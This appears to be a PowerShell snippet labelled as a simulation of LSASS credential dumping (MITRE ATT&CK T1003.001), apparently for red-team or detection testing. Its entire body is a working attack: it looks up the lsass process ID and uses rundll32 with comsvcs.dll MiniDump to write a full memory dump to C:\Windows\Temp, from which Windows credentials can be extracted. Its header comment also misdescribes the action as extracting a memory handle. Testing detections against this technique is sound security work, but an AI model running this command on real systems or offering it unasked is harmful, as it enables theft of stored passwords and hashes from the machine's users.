# LSASS Credential Dumping Simulation via comsvcs.dll (MITRE ATT&CK T1003.001)
# Extracts lsass process memory handle using built-in Windows DLL

$lsassPID = (Get-Process lsass).Id
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $lsassPID C:\Windows\Temp\lsass.dmp full